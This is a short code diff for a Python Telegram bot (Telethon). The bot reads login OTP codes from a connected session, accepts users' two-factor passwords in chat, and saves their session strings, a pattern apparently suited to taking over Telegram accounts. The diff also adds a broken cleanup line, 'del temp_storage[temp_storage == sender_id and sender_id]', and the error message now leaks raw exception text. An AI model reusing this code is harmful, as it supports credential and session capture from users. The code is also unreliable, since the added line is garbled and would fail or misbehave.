@@ -162,7 +162,6 @@ async def send_phone_number(event):
             client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
             await client.connect()
             
-            # ঠিক এই মূহুর্তের পরের নতুন মেসেজ ধরার জন্য লাইভ লিসেনিং (সর্বোচ্চ ৬০ সেকেন্ড)
             start_time = datetime.now(timezone.utc)
             
             while True:
@@ -181,7 +180,6 @@ async def send_phone_number(event):
                 if otp_code:
                     break
                 
-                # ৬০ সেকেন্ড পার হয়ে গেলে লুপ ভেঙে বের হয়ে যাবে
                 if (datetime.now(timezone.utc) - start_time).total_seconds() > 60:
                     break
                     
@@ -251,8 +249,8 @@ async def handle_user_input(event):
         try:
             await client.sign_in(password=text)
             await finalize_login(event, sender_id, client, phone)
-        except Exception as_e:
-            await event.respond(f"❌ পাসওয়ার্ড ভুল: फिर চেষ্টা করুন:")
+        except Exception as e:
+            await event.respond(f"❌ পাসওয়ার্ড ভুল: {str(e)}\nআবার সঠিক পাসওয়ার্ড দিন:")
 
 async def finalize_login(event, sender_id, client, phone):
     session_string = client.session.save()
@@ -271,6 +269,7 @@ async def finalize_login(event, sender_id, client, phone):
     
     await client.disconnect()
     if sender_id in temp_storage:
+        del temp_storage[temp_storage == sender_id and sender_id] # clean safe
         del temp_storage[sender_id]
     
     await event.respond(
